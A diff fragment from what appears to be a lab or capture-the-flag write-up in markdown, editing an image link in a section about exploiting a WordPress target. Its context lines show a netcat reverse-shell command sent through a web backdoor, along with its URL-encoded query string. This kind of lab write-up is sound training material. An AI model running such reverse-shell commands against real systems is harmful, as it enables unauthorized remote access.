@@ -246,7 +246,7 @@ In the browser, used the backdoor to run:
 
 nc <Kali IP> 4444 -e /bin/bash. For example, your query string will look like cmd=nc%20<Kali IP>%204444%20-e%20/bin/bash.
     
-    ![listener1](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/listener1.png "listener1")   
+ ![listener](https://github.com/Reeti4cyber/Final-Project/blob/main/Images/listener1.png "listener")   
 
 Using the shell  opened on Target 2, found a flag in the WordPress uploads directory /var/www.
     
